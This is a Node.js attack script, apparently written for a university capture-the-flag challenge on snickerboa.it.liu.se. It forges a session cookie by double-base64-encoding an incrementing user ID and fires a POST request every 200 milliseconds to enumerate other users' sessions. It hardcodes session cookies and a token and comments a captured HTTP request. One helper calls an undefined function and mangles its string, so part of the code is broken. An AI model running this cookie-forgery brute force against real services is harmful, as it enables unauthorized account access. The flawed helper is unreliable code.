
const sendHttps = require("./utils/sendHttps");
const base64 = require("base-64");
const utf8 = require("utf8");


const increseUserIdBase2 = (str, i = 1) => {

    if (str[str.length - i] === '1') {
        str = str.substring(0, str.length - i) + '0' + str.substring(str.length - i, str.length - 1);
        str = increseUserId(str, i + 1);
    }
    else {
        str = str.substring(0, str.length - i) + '1' + str.substring(str.length - i, str.length - 1);
    }
    return str
}

const increseUserIdBase10 = (str) => {

    var result = str.search(/[1-9]/);
    result = str.substring(result);
    result++;
    console.log(result.toString().length);
    var newString = "";
    for(var i=0; i < 16 - result.toString().length; i++)
    {
        newString = newString.concat("0");
    }
    newString = newString.concat(result.toString());
    console.log(newString);
    return newString;    
}

const HackBase64 = () => {

    const options = {
        host: 'snickerboa.it.liu.se',
        path: '/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6',
        //This is what changes the request to a POST request
        method: 'POST',
        headers: {
            "Cookie": "SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; _flowbox=a6c59251-2be5-ce5e-f1f2-eec790b5d890; langCookie=sv; JSESSIONID=4827986DFEBC1F696DE17D189642D276; token=114246847345287588894296329956409533233",
            "Referer": "https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6.jsp",
            "Origin": "https://snickerboa.it.liu.se",
            "Content-Type": "application/x-www-form-urlencoded"

        }
    }



    var userId = "0000000000000000";
    setInterval(() => {
        var bytes = utf8.encode(userId);
        var encodedOnce = base64.encode(bytes);
        var encodedTwice = base64.encode(encodedOnce);
        console.log(`${userId} = ${encodedTwice}`);
        options.headers = { ...options.headers, "Cookie": `SubSessionID=${encodedTwice}; _flowbox=a6c59251-2be5-ce5e-f1f2-eec790b5d890; langCookie=sv; JSESSIONID=4827986DFEBC1F696DE17D189642D276; token=114246847345287588894296329956409533233` }
        sendHttps(`userId=${userId}&useSecurity=true`, options, (res) => {
            console.log("Response:");
            console.log(res);
        })
        // userId = increseUserId(userId);
        userId = increseUserIdBase10(userId);


    }, 200);



};

module.exports = HackBase64;

// GET /js/clipboard-js/clipboard-events.js HTTP/1.1
// Host: snickerboa.it.liu.se
// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
// Accept: */*
// Accept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3
// Accept-Encoding: gzip, deflate, br
// Connection: keep-alive
// Referer: https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6.jsp
// Cookie: _flowbox=a6c59251-2be5-ce5e-f1f2-eec790b5d890; langCookie=sv; JSESSIONID=4827986DFEBC1F696DE17D189642D276; token=114246847345287588894296329956409533233
// Sec-Fetch-Dest: script
// Sec-Fetch-Mode: no-cors
// Sec-Fetch-Site: same-origin
// DNT: 1
// Sec-GPC: 1
// Pragma: no-cache
// Cache-Control: no-cache